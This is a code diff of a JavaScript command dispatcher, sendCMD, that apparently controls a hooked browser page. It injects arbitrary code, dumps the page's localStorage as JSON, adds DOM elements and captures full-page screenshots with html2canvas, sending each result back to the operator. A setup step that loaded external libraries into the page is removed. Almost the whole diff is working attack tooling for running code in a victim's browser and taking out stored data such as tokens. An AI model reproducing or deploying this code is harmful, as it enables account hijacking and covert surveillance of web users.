@@ -96,7 +96,7 @@ async function sendCMD(type,data) {
         break;
         case "localstorage":
             await SendPackagedCode(`
-                _return(localStorage);    
+               _return(JSON.stringify(localStorage));  
             `)
         break;
         case "code":
@@ -121,7 +121,7 @@ async function sendCMD(type,data) {
                 `)
             }
         break;
-        case "editDOM":
+        case "addElm":
             await SendPackagedCode(`
                 (function() {
                     var _p = document.createElement("div");
@@ -131,30 +131,19 @@ async function sendCMD(type,data) {
                 })();    
             `)
         break;
-        case "setUp": 
-            await SendPackagedCode(`
-                (function() {
-                    var j = document.createElement("script");
-                    j.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
-                    j.onload = function() {
-                        _return(true);
-                    }
-                    document.body.appendChild(j);
-                })();    
-            `);
-            await SendPackagedCode(`
-                (function() {
-                    var j = document.createElement("script");
-                    j.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js';
-                    j.onload = function() {
-                        _return(true);
-                    }
-                    document.body.appendChild(j);
-                })();    
-            `)
+        case "screenShot": 
+        await SendPackagedCode(`
+            (function() {
+                html2canvas(document.querySelector("html")).then(canvas => {
+                     _return(canvas.toDataURL("image/png").replace("image/png", "image/octet-stream"));
+                });
+            })();    
+        `)
         break;
         
-
+        case "help":
+            console.log("COMMANDS:","inject","info","localstorage","code","varibles","addElm","screenShot");
+        break;
         default: 
         console.log("Type not found");
     }
